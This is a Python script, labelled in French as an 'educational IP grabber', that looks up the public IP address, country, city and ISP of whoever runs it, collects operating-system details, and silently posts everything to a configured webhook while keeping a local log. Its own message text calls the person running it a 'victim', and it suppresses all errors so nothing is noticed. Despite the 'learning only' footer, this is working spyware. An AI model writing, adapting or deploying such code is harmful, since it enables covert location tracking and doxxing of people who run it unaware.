import urllib.request
import json
import platform
import datetime
import os
import sys

CONFIG_FILE = "config.json"

if not os.path.exists(CONFIG_FILE):
    sys.exit(1)

with open(CONFIG_FILE, "r", encoding="utf-8") as f:
    config = json.load(f)

WEBHOOK_URL = config.get("webhook_url")
if not WEBHOOK_URL:
    sys.exit(0)

def get_ip_and_geo():
    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
    
    try:
        req = urllib.request.Request(
            "http://ip-api.com/json/?fields=status,message,country,countryCode,regionName,city,isp,query,timezone",
            headers={"User-Agent": user_agent},
            method="GET"
        )
        with urllib.request.urlopen(req, timeout=6) as response:
            data = json.loads(response.read().decode("utf-8"))
            if data.get("status") == "success":
                return data, user_agent
    except:
        pass

    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json", timeout=4) as r:
            ip = json.loads(r.read().decode("utf-8"))["ip"]
            return {"query": ip, "status": "fallback"}, user_agent
    except:
        return {"query": "Inconnue", "status": "error"}, user_agent

info, user_agent = get_ip_and_geo()
ip = info.get("query", "Inconnue")
country = info.get("country", "Inconnu")
city = info.get("city", "Inconnue")
isp = info.get("isp", "Inconnu")
country_code = info.get("countryCode", "").lower()

os_info = f"{platform.system()} {platform.release()} ({platform.architecture()[0]})"
now = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
utc_now = datetime.datetime.utcnow().isoformat()

color_hex = config.get("embed_color", "#00FF00").lstrip("#")
color = int(color_hex, 16)

embed = {
    "title": config.get("embed_title", "🌍 Nouvelle IP Capturée !"),
    "description": "**Une victime vient d'exécuter le script éducatif**",
    "color": color,
    "thumbnail": {
        "url": f"https://flagcdn.com/w320/{country_code}.png" if country_code else "https://i.imgur.com/removed.png"
    },
    "fields": [
        {"name": "📍 IP Publique", "value": f"`{ip}`", "inline": True},
        {"name": "🌍 Pays", "value": f"{country} `{country_code.upper()}`", "inline": True},
        {"name": "🏙️ Ville", "value": city, "inline": True},
        {"name": "🔌 FAI", "value": isp, "inline": False},
        {"name": "💻 OS", "value": os_info, "inline": True},
        {"name": "⏰ Heure", "value": now, "inline": True},
        {"name": "🕵️ User-Agent", "value": f"```{user_agent[:80]}...```", "inline": False},
    ],
    "footer": {
        "text": "IP Grabber Éducatif • Made for learning only"
    },
    "timestamp": utc_now
}

payload = {
    "username": "IP Grabber Éducatif",
    "avatar_url": "https://i.imgur.com/removed.png",
    "embeds": [embed]
}

try:
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(
        WEBHOOK_URL,
        data=data,
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    with urllib.request.urlopen(req, timeout=5):
        pass
except:
    pass

if config.get("log_to_file", True):
    log_entry = {
        "timestamp": now,
        "ip": ip,
        "country": country,
        "city": city,
        "isp": isp,
        "os": os_info
    }
    try:
        with open("ip_logs.txt", "a", encoding="utf-8") as f:
            f.write(json.dumps(log_entry, ensure_ascii=False) + "\n")
    except:
        pass
